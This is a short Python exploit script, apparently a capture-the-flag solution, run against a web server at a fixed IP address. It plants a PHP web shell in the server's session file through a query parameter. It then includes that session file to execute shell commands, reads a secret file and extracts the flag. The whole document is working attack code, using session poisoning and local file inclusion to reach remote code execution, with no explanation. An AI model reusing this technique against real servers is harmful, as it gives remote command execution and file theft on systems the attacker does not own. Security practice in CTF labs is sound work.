#!/usr/bin/python3
from requests import Session
from re import findall

s = Session()

url = "http://44.200.237.73/"

payload = "<?php system($_GET['cmd']); ?>"

r = s.get(url + "?karma=" + payload)
#print(r.text)

cookie = r.cookies["PHPSESSID"]
#print(cookie)

r = s.get(url + f"?karma=/tmp/sess_{cookie}" + "&cmd=cat /seCretJutsuToKillBorUtoKun.txt")

#print(r.text)

print(findall("FLAG{.*}", r.text)[0])